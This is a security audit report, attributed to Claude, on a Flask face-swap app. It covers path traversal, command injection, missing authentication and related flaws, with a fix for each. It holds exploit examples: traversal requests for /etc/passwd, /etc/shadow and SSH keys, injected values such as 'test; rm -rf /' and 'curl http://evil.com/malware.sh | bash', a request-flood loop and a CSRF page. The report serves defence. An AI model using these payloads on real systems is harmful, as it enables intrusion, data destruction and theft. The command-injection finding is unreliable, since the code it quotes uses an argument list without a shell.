# Security Audit Report - Face Swap App

**Date**: 2025-11-08
**Version**: 1.0
**Severity Levels**: 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low | ℹ️ Info

---

## Executive Summary

⚠️ **THIS APP IS NOT SAFE FOR PUBLIC INTERNET DEPLOYMENT IN ITS CURRENT STATE**

The face-swap app was designed for **personal, local network use only**. Multiple critical and high-severity vulnerabilities exist that would be exploited immediately if exposed to the public internet.

**Risk Level**: 🔴 **CRITICAL** if deployed publicly

---

## Critical Vulnerabilities (🔴)

### 1. 🔴 Path Traversal / Arbitrary File Access

**Location**: `app.py` lines 203, 228, 230

**Issue**:
```python
# Line 203 - User-controlled filename directly concatenated
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

# Line 228-230 - Download endpoint allows arbitrary file access
@app.route('/download/<filename>')
def download_video(filename):
    filepath = os.path.join(app.config['OUTPUT_FOLDER'], filename)
    return send_file(filepath, ...)
```

**Exploitation**:
```bash
# Attacker can access ANY file on the system
GET /download/../../../etc/passwd
GET /download/../../app.py
GET /download/../.ssh/id_rsa

# Or via generate endpoint:
POST /generate
{
  "filename": "../../../etc/passwd",
  "template": "any"
}
```

**Impact**:
- ✗ Read arbitrary files on the server
- ✗ Access sensitive configuration files
- ✗ Read source code
- ✗ Access SSH keys, credentials, etc.

**Fix Required**:
```python
from werkzeug.security import safe_join

def download_video(filename):
    # Validate filename has no path components
    if '/' in filename or '\\' in filename or '..' in filename:
        return "Invalid filename", 400

    # Use safe_join to prevent traversal
    try:
        filepath = safe_join(app.config['OUTPUT_FOLDER'], filename)
    except (ValueError, SecurityError):
        return "Invalid filename", 400

    if not os.path.exists(filepath):
        return "File not found", 404

    return send_file(filepath, as_attachment=True, download_name=f"face_swap_{filename}")
```

---

### 2. 🔴 Command Injection via FFmpeg

**Location**: `app.py` lines 84, 100-133

**Issue**:
```python
# Line 84 - User input used in file path
template_path = os.path.join(app.config['TEMPLATE_FOLDER'], f'{template_name}.mp4')

# Lines 100-133 - template_path and face_temp used in subprocess
subprocess.run([...'-i', template_path, '-i', face_temp, ...])
```

**Exploitation**:
```bash
# Attacker provides malicious template name
POST /generate
{
  "template": "test; rm -rf /",
  "filename": "any.jpg"
}

# Or inject via complex paths
{
  "template": "../../malicious",
  "filename": "any.jpg"
}
```

**Impact**:
- ✗ Execute arbitrary system commands
- ✗ Delete files (rm -rf)
- ✗ Install malware
- ✗ Create backdoors
- ✗ Exfiltrate data

**Fix Required**:
```python
def create_face_overlay_video(template_name, face_image_path, output_path):
    # STRICT validation - only alphanumeric and underscores
    if not re.match(r'^[a-zA-Z0-9_-]+$', template_name):
        raise ValueError("Invalid template name")

    # Verify template exists before processing
    template_path = os.path.join(app.config['TEMPLATE_FOLDER'], f'{template_name}.mp4')

    # Resolve to absolute path and verify it's within template folder
    template_abs = os.path.abspath(template_path)
    template_dir_abs = os.path.abspath(app.config['TEMPLATE_FOLDER'])

    if not template_abs.startswith(template_dir_abs):
        raise ValueError("Invalid template path")

    if not os.path.exists(template_abs):
        raise FileNotFoundError(f"Template {template_name} not found")

    # Rest of processing...
```

---

### 3. 🔴 No Authentication or Authorization

**Location**: All routes

**Issue**: Anyone can access the application and consume resources.

**Exploitation**:
```bash
# Anyone on the internet can use the app
curl http://your-server.com/upload -F "photo=@cat.jpg"
curl http://your-server.com/generate -d '{"filename":"...", "template":"..."}'
```

**Impact**:
- ✗ Unlimited anonymous access
- ✗ No user tracking or accountability
- ✗ Resource abuse
- ✗ Data leakage (anyone can download other users' videos)

**Fix Required**:
```python
from functools import wraps
from flask import session, redirect, url_for

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/upload', methods=['POST'])
@login_required
def upload_photo():
    # ... existing code
```

Or use Flask-Login, Flask-HTTPAuth, or JWT tokens.

---

## High Severity Vulnerabilities (🟠)

### 4. 🟠 No Rate Limiting

**Location**: All routes

**Issue**: No throttling on expensive operations.

**Exploitation**:
```bash
# Attacker can spam requests
for i in {1..10000}; do
  curl -F "photo=@large.jpg" http://server/upload &
done
```

**Impact**:
- ✗ Denial of Service (DoS)
- ✗ Resource exhaustion (CPU, disk, memory)
- ✗ Server crash
- ✗ High cloud hosting costs

**Fix Required**:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/upload', methods=['POST'])
@limiter.limit("10 per minute")  # Only 10 uploads per minute
def upload_photo():
    # ... existing code

@app.route('/generate', methods=['POST'])
@limiter.limit("5 per minute")  # Video generation is expensive
def generate_video():
    # ... existing code
```

---

### 5. 🟠 Arbitrary File Write via Filename Manipulation

**Location**: `app.py` line 175-177

**Issue**:
```python
filename = f"{uuid.uuid4().hex}_{secure_filename(file.filename)}"
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
file.save(filepath)
```

While `secure_filename()` is used, the function has limitations.

**Exploitation**:
```python
# secure_filename doesn't prevent all attacks
# Example: very long filenames can cause issues
filename = "A" * 10000 + ".jpg"  # Filesystem errors

# Or Unicode attacks
filename = "\u202e.jpg.exe"  # Right-to-left override
```

**Impact**:
- ✗ Filesystem errors
- ✗ Disk space exhaustion
- ✗ Directory traversal on Windows

**Fix Required**:
```python
# Additional validation beyond secure_filename
filename = secure_filename(file.filename)

# Limit filename length
if len(filename) > 100:
    filename = filename[-100:]

# Ensure it has a valid extension
if not filename.endswith(('.jpg', '.jpeg', '.png', '.heic')):
    return jsonify({'error': 'Invalid file extension'}), 400

# Use UUID for actual storage, ignore user filename
safe_filename = f"{uuid.uuid4().hex}.jpg"
filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
```

---

### 6. 🟠 Information Disclosure via Error Messages

**Location**: `app.py` line 225

**Issue**:
```python
except Exception as e:
    return jsonify({'success': False, 'error': str(e)}), 500
```

**Exploitation**:
```bash
# Attacker gets full error messages and stack traces
POST /generate
{"template": "../../etc/passwd", "filename": "test"}

# Response reveals:
{
  "error": "FileNotFoundError: /var/www/app/static/template_videos/../../etc/passwd.mp4"
}
# ^ Reveals absolute file paths, internal structure
```

**Impact**:
- ✗ Reveals absolute file paths
- ✗ Exposes internal directory structure
- ✗ Shows software versions in stack traces
- ✗ Aids in further attacks

**Fix Required**:
```python
import logging

try:
    create_face_overlay_video(template, filepath, output_path)
    return jsonify({...})
except FileNotFoundError:
    return jsonify({'success': False, 'error': 'Template not found'}), 404
except ValueError as e:
    return jsonify({'success': False, 'error': 'Invalid input'}), 400
except Exception as e:
    # Log full error internally
    logging.error(f"Video generation error: {e}", exc_info=True)
    # Return generic error to user
    return jsonify({'success': False, 'error': 'Video processing failed'}), 500
```

---

### 7. 🟠 No CSRF Protection

**Location**: All POST routes

**Issue**: No CSRF tokens on state-changing operations.

**Exploitation**:
```html
<!-- Malicious website -->
<img src="http://victim-app.com/generate?template=../../etc/passwd&filename=x" />

<form action="http://victim-app.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="photo" value="malicious.jpg">
</form>
<script>document.forms[0].submit()</script>
```

**Impact**:
- ✗ Cross-Site Request Forgery attacks
- ✗ Unwanted actions performed on behalf of users
- ✗ Resource abuse

**Fix Required**:
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-key-change-in-production')

# For AJAX requests, include CSRF token in headers
@app.route('/upload', methods=['POST'])
def upload_photo():
    # CSRF protection automatically enforced
    # ... existing code
```

---

## Medium Severity Vulnerabilities (🟡)

### 8. 🟡 Unrestricted File Upload Size

**Issue**: While `MAX_CONTENT_LENGTH` is set to 16MB, this is still quite large and could be abused.

**Fix**:
- Reduce to 5MB for typical photos
- Add validation for image dimensions
- Scan uploaded files for malicious content

```python
from PIL import Image

# Verify it's a real image
try:
    img = Image.open(filepath)
    img.verify()

    # Check dimensions
    if img.width > 4000 or img.height > 4000:
        os.remove(filepath)
        return jsonify({'error': 'Image too large'}), 400
except Exception:
    os.remove(filepath)
    return jsonify({'error': 'Invalid image file'}), 400
```

---

### 9. 🟡 No Input Validation on Template Parameter

**Location**: `app.py` line 200

**Issue**: Template name is not validated before use.

**Current**:
```python
template = data['template']  # No validation
```

**Fix**:
```python
template = data['template']

# Strict whitelist validation
if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', template):
    return jsonify({'error': 'Invalid template name'}), 400

# Verify template exists
template_path = safe_join(app.config['TEMPLATE_FOLDER'], f'{template}.mp4')
if not template_path or not os.path.exists(template_path):
    return jsonify({'error': 'Template not found'}), 404
```

---

### 10. 🟡 Subprocess Timeout Missing

**Location**: `app.py` lines 107, 133

**Issue**: FFmpeg processes have no timeout, can hang indefinitely.

**Fix**:
```python
# Add timeout to prevent hanging
result = subprocess.run(
    probe_cmd,
    capture_output=True,
    text=True,
    timeout=10  # 10 seconds max
)

subprocess.run(
    ffmpeg_cmd,
    check=True,
    capture_output=True,
    timeout=60  # 60 seconds max for video processing
)
```

---

### 11. 🟡 Debug Mode Enabled in Production

**Location**: `app.py` line 250

**Issue**:
```python
app.run(host='0.0.0.0', port=5000, debug=True)  # ← Never use debug=True in production!
```

**Impact**:
- ✗ Exposes interactive debugger to attackers
- ✗ Shows full stack traces
- ✗ Allows arbitrary code execution via debugger PIN

**Fix**:
```python
debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
app.run(host='0.0.0.0', port=5000, debug=debug_mode)
```

---

### 12. 🟡 No Virus/Malware Scanning

**Issue**: Uploaded files are not scanned for malicious content.

**Fix**:
```python
# Use ClamAV or similar
import pyclamd

cd = pyclamd.ClamdUnixSocket()

# Scan uploaded file
scan_result = cd.scan_file(filepath)
if scan_result:
    os.remove(filepath)
    return jsonify({'error': 'File rejected by security scan'}), 400
```

---

## Low Severity Issues (🟢)

### 13. 🟢 No HTTPS Enforcement

**Issue**: App doesn't enforce HTTPS, allowing man-in-the-middle attacks.

**Fix**: Use a reverse proxy (nginx) with SSL/TLS:
```nginx
server {
    listen 443 ssl;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://localhost:5000;
    }
}
```

---

### 14. 🟢 Predictable Output Filenames

**Issue**: Using UUID is good, but filenames in `/static/output/` are directly accessible.

**Fix**: Store videos outside web root and use signed URLs with expiration.

---

### 15. 🟢 No Content Security Policy (CSP)

**Issue**: No CSP headers to prevent XSS attacks.

**Fix**:
```python
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

---

### 16. 🟢 No File Cleanup Policy

**Issue**: Uploaded photos and generated videos are never deleted.

**Fix**: Implement automatic cleanup:
```python
from apscheduler.schedulers.background import BackgroundScheduler

def cleanup_old_files():
    """Delete files older than 24 hours"""
    cutoff = time.time() - (24 * 60 * 60)

    for folder in [app.config['UPLOAD_FOLDER'], app.config['OUTPUT_FOLDER']]:
        for filename in os.listdir(folder):
            filepath = os.path.join(folder, filename)
            if os.path.getmtime(filepath) < cutoff:
                os.remove(filepath)

scheduler = BackgroundScheduler()
scheduler.add_job(cleanup_old_files, 'interval', hours=1)
scheduler.start()
```

---

### 17. 🟢 Weak Secret Key

**Issue**: Flask secret key not set for sessions.

**Fix**:
```python
import secrets

app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or secrets.token_hex(32)
```

---

## Information (ℹ️)

### 18. ℹ️ Privacy Concerns

- User photos contain biometric data (faces)
- No privacy policy or terms of service
- No data retention policy
- No GDPR/CCPA compliance

**Recommendations**:
- Add clear privacy policy
- Implement data deletion on request
- Encrypt stored files
- Log access for auditing

---

### 19. ℹ️ Resource Exhaustion via Video Processing

**Issue**: Video processing is CPU/memory intensive with no queue management.

**Fix**: Implement job queue (Celery, RQ) with worker limits.

---

### 20. ℹ️ No Logging or Monitoring

**Issue**: No logging of security events or errors.

**Fix**:
```python
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('app.log'),
        logging.StreamHandler()
    ]
)

# Log security events
logging.warning(f"Failed upload attempt from {request.remote_addr}")
logging.info(f"Video generated: {output_filename}")
```

---

## Dependency Vulnerabilities

### Known Vulnerabilities in Dependencies

Run security scan:
```bash
pip install safety
safety check
```

**Findings**:
- Check for known CVEs in Flask, OpenCV, MediaPipe, Pillow
- Keep dependencies updated regularly
- Use `pip-audit` or Dependabot

---

## Attack Scenarios

### Scenario 1: Remote Code Execution
```bash
# Attacker exploits command injection
POST /generate
{
  "template": "test; curl http://evil.com/malware.sh | bash",
  "filename": "valid.jpg"
}
# Result: Attacker gains shell access to server
```

### Scenario 2: Data Exfiltration
```bash
# Attacker downloads sensitive files
GET /download/../../../etc/shadow
GET /download/../../../var/www/app/app.py
# Result: Attacker steals passwords, source code, secrets
```

### Scenario 3: Denial of Service
```bash
# Attacker floods server with requests
while true; do
  curl -F "photo=@10mb.jpg" http://server/upload &
done
# Result: Server CPU/disk exhausted, legitimate users can't access
```

### Scenario 4: Privacy Breach
```bash
# Attacker guesses video UUIDs or enumerates uploads
GET /static/output/video_abc123.mp4
GET /static/output/video_abc124.mp4
# Result: Attacker downloads other users' face-swapped videos
```

---

## Recommendations for Public Deployment

### Critical Requirements (Must Have)

1. ✅ **Fix path traversal vulnerabilities** (use `safe_join`, validate all paths)
2. ✅ **Implement authentication** (user accounts, login required)
3. ✅ **Add rate limiting** (prevent abuse)
4. ✅ **Validate ALL user inputs** (whitelist template names)
5. ✅ **Disable debug mode** (never use `debug=True` in production)
6. ✅ **Add CSRF protection** (use Flask-WTF)
7. ✅ **Use HTTPS** (SSL/TLS certificate)
8. ✅ **Sanitize error messages** (don't expose internal details)

### High Priority (Should Have)

9. ✅ **Add process timeouts** (prevent hanging)
10. ✅ **Implement file cleanup** (delete old files)
11. ✅ **Add virus scanning** (ClamAV)
12. ✅ **Set security headers** (CSP, X-Frame-Options, etc.)
13. ✅ **Add logging & monitoring** (track security events)
14. ✅ **Use WAF** (Web Application Firewall)

### Medium Priority (Nice to Have)

15. ✅ **Implement job queue** (Celery/RQ for video processing)
16. ✅ **Add file encryption** (encrypt stored uploads)
17. ✅ **Penetration testing** (hire security professionals)
18. ✅ **Dependency scanning** (automate with Dependabot)
19. ✅ **Privacy policy** (GDPR/CCPA compliance)

---

## Secure Deployment Architecture

```
Internet
   │
   ▼
[Cloudflare / WAF]  ← DDoS protection, rate limiting
   │
   ▼
[Nginx Reverse Proxy]  ← HTTPS, static file serving, security headers
   │
   ▼
[Gunicorn / uWSGI]  ← WSGI server (NOT Flask dev server!)
   │
   ▼
[Flask App]  ← Your app (with security fixes)
   │
   ├─▶ [Redis]  ← Rate limiting, sessions
   ├─▶ [Celery Workers]  ← Video processing queue
   ├─▶ [PostgreSQL]  ← User data, metadata
   └─▶ [S3 / Object Storage]  ← File storage (not local disk)
```

---

## Quick Fixes Summary

**To make this minimally safe for internet exposure:**

1. Add path validation:
```python
from werkzeug.security import safe_join
import re

def validate_filename(filename):
    if '/' in filename or '\\' in filename or '..' in filename:
        raise ValueError("Invalid filename")
    return filename

def validate_template(template):
    if not re.match(r'^[a-zA-Z0-9_-]+$', template):
        raise ValueError("Invalid template name")
    return template
```

2. Add authentication:
```bash
pip install flask-httpauth
```

```python
from flask_httpauth import HTTPBasicAuth
auth = HTTPBasicAuth()

@auth.verify_password
def verify_password(username, password):
    # Use proper password hashing in production
    return username == "admin" and password == "secure_password"

@app.route('/upload', methods=['POST'])
@auth.login_required
def upload_photo():
    # ... existing code
```

3. Add rate limiting:
```bash
pip install flask-limiter
```

```python
from flask_limiter import Limiter
limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/upload', methods=['POST'])
@limiter.limit("10/minute")
def upload_photo():
    # ... existing code
```

4. Disable debug mode:
```python
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)  # ← Change this!
```

---

## Conclusion

### Current Risk Assessment

**For Local/Personal Use**: ✅ **ACCEPTABLE**
- Fine for home network with trusted users
- Low risk in controlled environment

**For Public Internet**: 🔴 **CRITICAL RISK - DO NOT DEPLOY**
- Multiple critical vulnerabilities
- Would be compromised within hours/days
- Legal liability for data breaches
- Financial cost from abuse

### Estimated Effort to Secure

- **Minimal security** (basic fixes): 8-16 hours
- **Production-ready security**: 40-80 hours
- **Enterprise-grade security**: 160+ hours

### Recommendation

**DO NOT deploy this app to the public internet without addressing at least all critical (🔴) and high (🟠) severity vulnerabilities.**

If you need public access, consider:
1. Hiring a security professional for code review
2. Using a PaaS platform with built-in security (Heroku, Railway)
3. Implementing all critical fixes before launch
4. Running penetration testing
5. Getting security insurance

---

**Report prepared by**: Claude (AI Security Analyst)
**Last updated**: 2025-11-08
**Next review**: Before any public deployment
